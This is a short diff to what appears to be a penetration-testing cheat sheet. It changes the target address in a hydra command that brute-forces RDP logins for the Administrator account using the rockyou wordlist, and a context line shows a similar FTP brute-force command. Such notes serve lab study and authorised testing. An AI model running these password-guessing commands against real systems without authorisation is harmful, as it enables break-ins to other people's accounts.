@@ -37,7 +37,7 @@ hydra -L users.txt -P passwords.txt -t 3 -s 21 <IP> ftp
 </div>
 
 ~~~bash
-hydra -f -l Administrator -P /usr/share/wordlists/rockyou.txt -o rdp-creds.txt rdp://10.11.1.221
+hydra -f -l Administrator -P /usr/share/wordlists/rockyou.txt -o rdp-creds.txt rdp://192.168.1.100
 ~~~
 
 <div class="grid">
